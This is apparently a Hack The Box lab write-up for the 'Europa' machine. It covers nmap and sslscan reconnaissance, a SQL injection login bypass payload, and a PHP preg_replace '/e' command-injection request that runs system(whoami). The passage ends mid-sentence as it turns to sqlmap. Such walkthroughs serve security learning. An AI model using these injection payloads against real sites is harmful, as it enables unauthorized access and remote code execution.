[[HTB-LABS]]
**source : [htb labs](https://app.hackthebox.com/machines/Europa)**
**difficulty : Medium**

Europa can present a bit of a challenge, or can be quite easy, depending on if you know what to look for. While it does not require many steps to complete, it provides a great learning experience in several fairly uncommon enumeration techniques and attack vectors.

#### recon
i run nmap using this command **`nmap -sCV -Pn -T4 10.10.10.22`**
```python
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 10:23 +03
Nmap scan report for 10.10.10.22
Host is up (0.13s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.77 seconds

```

this what port `80` and `443` look like:
`http://10.10.10.22:80/`
![[Pasted image 20251008120944.png]]

`http://10.10.10.22:443/`
![[Pasted image 20251008121041 1.png]]

until now there's nothing , so i run this command **`sslscan 10.10.10.22`**
and the result was like this
```python
Version: 2.1.5
OpenSSL 3.5.3 16 Sep 2025

Connected to 10.10.10.22

Testing SSL server 10.10.10.22 on port 443 using SNI name 10.10.10.22

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     disabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLSv1.2 not vulnerable to heartbleed
TLSv1.1 not vulnerable to heartbleed
TLSv1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 2048 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 2048 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits
Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 2048 bits

  Server Key Exchange Group(s):
TLSv1.2  141 bits  sect283k1
TLSv1.2  141 bits  sect283r1
TLSv1.2  204 bits  sect409k1
TLSv1.2  204 bits  sect409r1
TLSv1.2  285 bits  sect571k1
TLSv1.2  285 bits  sect571r1
TLSv1.2  128 bits  secp256k1
TLSv1.2  128 bits  secp256r1 (NIST P-256)
TLSv1.2  192 bits  secp384r1 (NIST P-384)
TLSv1.2  260 bits  secp521r1 (NIST P-521)
TLSv1.2  128 bits  brainpoolP256r1
TLSv1.2  192 bits  brainpoolP384r1
TLSv1.2  256 bits  brainpoolP512r1

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    3072

Subject:  europacorp.htb
Altnames: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
Issuer:   europacorp.htb

Not valid before: Apr 19 09:06:22 2017 GMT
Not valid after:  Apr 17 09:06:22 2027 GMT

```

as you see it found two Alt-names one is `www.europacorp.htb` and the other one is 
`admin-portal.europacorp.htb` admin portal is the most valuable so i will add it to `/etc/hosts`

after going to **`https://admin-portal.europacorp.htb/`** it will show us login page 
![[Pasted image 20251008121818 1.png]]

here after try some sqli payloads , i found i can login without need the password but i dont have the email and i need to found it 
i found this email **`admin@europacorp.htb`**
how?

![[Pasted image 20251008122350 1.png]]
click on lock then press `connection` 
then click on `more information`
then `view certificate`
will show some info , i found the email there

#### use sqli to login
to login i use burp to intercept the login request and i change the `POST` data to this 
**`email=admin%40europacorp.htb'-- -&password=ddddwoowo`**  
now i'm in
i was in dashboard after crawling i found this `https://admin-portal.europacorp.htb/tools.php` that could let me in the machine 
![[Pasted image 20251008123253 1.png]]
write anything and intercept it by burp and the request will look like this : (after decode it)
```python
POST /tools.php HTTP/1.1
Host: admin-portal.europacorp.htb
Cookie: PHPSESSID=o2ijk8chp7f6t0446m8n7bgkd2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 1681
Origin: https://admin-portal.europacorp.htb
Referer: https://admin-portal.europacorp.htb/tools.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

pattern=/ip_address/&ipaddress=ali&text="openvpn": {
        "vtun0": {
                "local-address": {
                        "10.10.10.1": "''"
                },
                "local-port": "1337",
                "mode": "site-to-site",
                "openvpn-option": [
                        "--comp-lzo",
                        "--float",
                        "--ping 10",
                        "--ping-restart 20",
                        "--ping-timer-rem",
                        "--persist-tun",
                        "--persist-key",
                        "--user nobody",
                        "--group nogroup"
                ],
                "remote-address": "ip_address",
                "remote-port": "1337",
                "shared-secret-key-file": "/config/auth/secret"
        },
        "protocols": {
                "static": {
                        "interface-route": {
                                "ip_address/24": {
                                        "next-hop-interface": {
                                                "vtun0": "''"
                                        }
                                }
                        }
                }
        }
}
                                
```

if you see here `/ip_address/` this is  Regular Expressions which is danger, after search i found that if i add `e` , like this `/ip_address/e` and change this to command `ipaddress=ali` change `ali` to the command

after all it will be like this **`pattern=/ip_address/e&ipaddress=system(whoami)&text="openvpn":`**'

but before all of this , dont forget that we have sqli and we can use sqlmap to get some `--dump`
by using this command
